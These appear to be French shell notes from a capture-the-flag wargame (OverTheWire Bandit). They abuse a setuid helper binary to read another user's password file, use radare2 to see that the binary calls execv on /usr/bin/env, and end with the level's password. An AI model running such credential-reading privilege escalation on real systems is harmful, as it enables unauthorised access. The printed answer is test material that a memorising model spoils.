# privilege escalation sur un binaire setuid
./bandit20-do id
# nous montre que le EUID est bandit20
# donc on peut exécuter une commande en son nom :
./bandit20-do "cat /etc/bandit_pass/bandit20"
# ah bah en fait ça marche pas
# un tour dans radare :
r2 bandit20-do
aa
pdf @ main
# nous montre qu'on execv("/usr/bin/env" suivi de l'argument envoyé)
# donc ./bandit20-do "cat /etc/bandit_pass/bandit20" revient à faire
/usr/bin/env "cat /etc/bandit_pass/bandit20"
# donc la faille exploite les variables d'environnement
export hack="cat /etc/bandit_pass/bandit20"
./bandit20-do $hack

GbKksEFF4yrVs6il55v6gwY5aVje5f0j
